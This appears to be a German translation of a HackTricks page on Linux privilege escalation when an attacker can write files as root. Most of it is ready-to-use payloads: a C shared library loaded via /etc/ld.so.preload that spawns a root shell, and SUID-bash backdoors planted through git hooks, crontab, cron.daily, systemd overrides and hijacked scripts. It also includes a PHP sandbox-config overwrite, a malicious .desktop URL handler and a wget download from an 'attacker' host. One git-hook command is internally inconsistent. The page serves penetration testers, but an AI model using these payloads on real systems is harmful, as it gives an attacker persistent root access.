# Beliebiges Schreiben von Dateien als root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Diese Datei verhält sich wie die Umgebungsvariable **`LD_PRELOAD`**, funktioniert aber auch bei **SUID binaries**.  
Wenn du sie erstellen oder ändern kannst, kannst du einfach einen **Pfad zu einer Library hinzufügen, der bei jedem ausgeführten Binary geladen wird**.

Zum Beispiel: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sind **Skripte**, die bei verschiedenen **Ereignissen** in einem Git-Repository **ausgeführt** werden, z. B. wenn ein commit erstellt wird, ein merge... Wenn also ein **privilegiertes Skript oder ein privilegierter Benutzer** diese Aktionen häufig ausführt und es möglich ist, **in den `.git`-Ordner zu schreiben**, kann dies für **privesc** genutzt werden.

Zum Beispiel ist es möglich, ein **Skript zu erzeugen** in einem Git-Repo in **`.git/hooks`**, sodass es bei jedem neuen commit immer ausgeführt wird:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Zeitdateien

Wenn du **cron-bezogene Dateien schreiben kannst, die root ausführt**, kannst du normalerweise Codeausführung beim nächsten Lauf des Jobs erreichen. Interessante Ziele sind:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Roots eigene crontab in `/var/spool/cron/` oder `/var/spool/cron/crontabs/`
- `systemd` timers und die Dienste, die sie auslösen

Schnelle Prüfungen:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typische Missbrauchspfade:

- **Einen neuen root cron job hinzufügen** zu `/etc/crontab` oder zu einer Datei in `/etc/cron.d/`
- **Ein script ersetzen**, das bereits von `run-parts` ausgeführt wird
- **Backdoor ein bestehendes timer target** indem du das script oder die binary änderst, die es startet

Minimales cron payload-Beispiel:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Wenn Sie nur in ein cron-Verzeichnis schreiben können, das von `run-parts` verwendet wird, legen Sie stattdessen dort eine ausführbare Datei ab:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Hinweise:

- `run-parts` ignoriert normalerweise Dateinamen, die Punkte enthalten, daher bevorzugen Sie Namen wie `backup` statt `backup.sh`.
- Einige Distros verwenden `anacron` oder `systemd` timers anstelle des klassischen cron`, aber die Missbrauchsidee ist dieselbe: **ändern, was root später ausführen wird**.

### Service- und Socket-Dateien

Wenn Sie **`systemd` unit files** oder von ihnen referenzierte Dateien schreiben können, könnten Sie Codeausführung als root erreichen, indem Sie die Unit neu laden und neu starten oder darauf warten, dass der service/socket-Aktivierungspfad ausgelöst wird.

Interessante Ziele sind:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service-Skripte/Binärdateien, die von `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` referenziert werden
- Beschreibbare `EnvironmentFile=`-Pfade, die von einem root Service geladen werden

Schnelle Prüfungen:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Häufige Missbrauchspfade:

- **Überschreibe `ExecStart=`** in einer root-eigenen Service-Unit, die du ändern kannst
- **Füge ein drop-in override hinzu** mit einem bösartigen `ExecStart=` und entferne zuerst das alte
- **Backdoor the script/binary**, das bereits von der Unit referenziert wird
- **Hijack a socket-activated service** indem du die entsprechende `.service`-Datei änderst, die gestartet wird, wenn der Socket eine Verbindung erhält

Beispiel für ein bösartiges override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typischer Aktivierungsablauf:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Wenn du Dienste nicht selbst neu starten kannst, aber eine socket-activated unit bearbeiten kannst, musst du möglicherweise nur **auf eine Client-Verbindung warten**, damit der mit einer Backdoor versehene Dienst als root ausgeführt wird.

### Überschreiben einer restriktiven `php.ini`, die von einer privilegierten PHP-Sandbox verwendet wird

Einige benutzerdefinierte Daemons validieren vom Benutzer geliefertes PHP, indem sie `php` mit einer **restriktiven `php.ini`** ausführen (zum Beispiel `disable_functions=exec,system,...`). Wenn der sandboxed Code weiterhin **irgendeine Schreibprimitive** (wie `file_put_contents`) besitzt und du den **genauen `php.ini`-Pfad** erreichen kannst, der vom Daemon verwendet wird, kannst du diese Konfiguration **überschreiben**, um die Einschränkungen aufzuheben und anschließend eine zweite Payload einsenden, die mit erhöhten Rechten ausgeführt wird.

Typischer Ablauf:

1. Erster Payload überschreibt die Sandbox-Konfiguration.
2. Zweiter Payload führt Code aus, da gefährliche Funktionen nun wieder aktiviert sind.

Minimales Beispiel (ersetze den vom Daemon verwendeten Pfad):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

Die Datei unter `/proc/sys/fs/binfmt_misc` zeigt an, welches Binary welche Dateitypen ausführen soll. TODO: Voraussetzungen prüfen, um dies auszunutzen, um eine rev shell auszuführen, wenn ein gängiger Dateityp geöffnet ist.

### Overwrite schema handlers (like http: or https:)

Ein Angreifer mit Schreibrechten in den Konfigurationsverzeichnissen des Opfers kann Dateien einfach ersetzen oder erstellen, die das Systemverhalten ändern und unbeabsichtigte Codeausführung verursachen. Durch das Ändern der Datei `$HOME/.config/mimeapps.list`, sodass HTTP- und HTTPS-URL-Handler auf eine bösartige Datei zeigen (z. B. `x-scheme-handler/http=evil.desktop`), stellt der Angreifer sicher, dass **das Klicken auf einen beliebigen http- oder https-Link den in dieser `evil.desktop`-Datei angegebenen Code auslöst**. Zum Beispiel führt nach dem Ablegen des folgenden bösartigen Codes in `evil.desktop` unter `$HOME/.local/share/applications` jeder Klick auf eine externe URL den eingebetteten Befehl aus:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Für mehr Infos siehe [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), wo es verwendet wurde, um eine reale Schwachstelle auszunutzen.

### Root führt vom Benutzer beschreibbare scripts/binaries aus

Wenn ein privilegierter Workflow so etwas wie `/bin/sh /home/username/.../script` (oder irgendein binary innerhalb eines Verzeichnisses, das einem unprivilegierten Benutzer gehört) ausführt, kannst du ihn übernehmen:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) to catch root invoking user-controlled paths:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Bestätige Schreibbarkeit:** stelle sicher, dass sowohl die Zieldatei als auch ihr Verzeichnis deinem Benutzer gehören bzw. von diesem beschreibbar sind.
- **Übernehme das Ziel:** sichere das originale Binary/Skript und lege eine Payload ab, die eine SUID shell erstellt (oder eine andere Root-Aktion ausführt), und stelle dann die Berechtigungen wieder her:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Führe die privilegierte Aktion aus** (z. B. durch Drücken eines UI-Buttons, der den helper startet). Wenn root den hijacked path erneut ausführt, hole die escalated shell mit `./rootshell -p`.

## Referenzen

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
